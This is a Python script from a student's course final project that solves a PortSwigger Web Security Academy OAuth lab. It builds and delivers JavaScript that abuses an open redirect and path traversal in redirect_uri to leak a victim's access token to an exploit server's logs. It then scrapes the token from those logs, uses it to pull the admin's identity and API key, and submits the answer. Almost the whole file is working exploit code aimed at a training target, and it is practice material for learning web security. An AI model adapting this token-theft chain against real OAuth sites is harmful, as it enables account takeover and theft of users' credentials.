# By Andrew Stevenson for CS595 at PSU Spring '21 Final Project
# Solves lab: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
import json

s = requests.Session()

# Get login form
site = 'ac0c1fe31ea1eeed80630022007f00bf.web-security-academy.net'
my_account_url = f'https://{site}/my-account'
resp = s.get(my_account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
sm_login_url = soup.meta['content'][6:]

# Stash these for later
sm_site = urlparse(sm_login_url).hostname
exploit_site = soup.find('a', {'id': 'exploit-link'})['href'][8:]
submit_solution_path = soup.find('button', {'id': 'submitSolution'})['path']
submit_solution_url = f'https://{site}{submit_solution_path}'
client_id = parse_qs(urlparse(sm_login_url).query)['client_id'][0]
print(f'Our client id is: \n{client_id}\n')

# Build & deliver the exploit
exploit_html = f'''<script>
  if (!document.location.hash) {{ // initiate an OAuth flow with the redirect_uri pointing to the open redirect
    window.location = 'https://{sm_site}/auth?client_id={client_id}&redirect_uri=https://{site}/oauth-callback/../post/next?path=https://{exploit_site}/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' 
  }} else {{ // leak the access token as query parameter to exploit server logs
    window.location = '/?'+document.location.hash.substr(1)
  }}
</script>
'''
exploit_url = f'https://{exploit_site}'
form_data = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
s.post(exploit_url, data=form_data)
print(f'Delivering exploit to victim: \n{exploit_html}\n')

# Search the logs to steal the token
logs_url = f'https://{exploit_site}/log'
resp = s.get(logs_url)
soup = BeautifulSoup(resp.text, 'html.parser')
beg = soup.pre.text.rfind('/?access_token') + len('/?access_token') + 1
end = soup.pre.text.find('&expires_in=', beg)
token = soup.pre.text[beg:end]
print(f'We just stole the admin token: \n{token}\n')

# Use the stolen token to grab identity from identity provider
token_url = f'https://{sm_site}/me'
headers = {
    'Authorization': f'Bearer {token}'
}
resp = s.get(token_url, headers=headers)
print(f'Identity provider reply: \n{resp.text}\n')

# Submit API key to win level
user_data = json.loads(resp.text)
form_data = {
    'answer': user_data['apikey']
}
s.post(submit_solution_url, data=form_data)

# Confirm the solution solved the lab
resp = s.get(my_account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup.find(text='Congratulations, you solved the lab!'))
